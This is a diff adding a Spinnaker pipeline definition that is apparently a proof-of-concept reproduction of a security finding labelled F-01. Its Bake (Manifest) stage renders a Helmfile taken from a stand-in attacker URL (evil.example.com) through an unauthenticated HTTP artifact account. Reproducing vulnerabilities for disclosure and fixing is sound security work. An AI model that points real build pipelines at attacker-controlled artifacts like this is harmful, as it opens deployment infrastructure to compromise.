@@ -1,0 +1,49 @@
+{
+  "application": "rosco-poc",
+  "id": "66d1272c-cf5f-4568-aff3-92f52455b03a",
+  "index": 0,
+  "name": "rosco-poc-pipeline",
+  "schema": "1",
+  "keepWaitingPipelines": false,
+  "limitConcurrent": true,
+  "spelEvaluator": "v4",
+  "description": "F-01 UI reproduction - Bake (Manifest)/Helmfile with an attacker-supplied artifact",
+  "triggers": [],
+  "parameterConfig": [],
+  "notifications": [],
+  "stages": [
+    {
+      "refId": "1",
+      "requisiteStageRefIds": [],
+      "type": "bakeManifest",
+      "name": "Bake (Manifest)",
+      "templateRenderer": "HELMFILE",
+      "outputName": "poc-manifests",
+      "namespace": "default",
+      "includeCRDs": false,
+      "evaluateOverrideExpressions": false,
+      "overrides": {},
+      "inputArtifacts": [
+        {
+          "artifact": {
+            "type": "http/file",
+            "name": "helmfile-entry",
+            "reference": "http://evil.example.com:8000/evil.yaml",
+            "artifactAccount": "no-auth-http-account"
+          }
+        }
+      ],
+      "expectedArtifacts": [
+        {
+          "id": "poc-produced",
+          "matchArtifact": {
+            "type": "embedded/base64",
+            "name": "poc-manifests"
+          },
+          "useDefaultArtifact": false,
+          "usePriorArtifact": false
+        }
+      ]
+    }
+  ]
+}
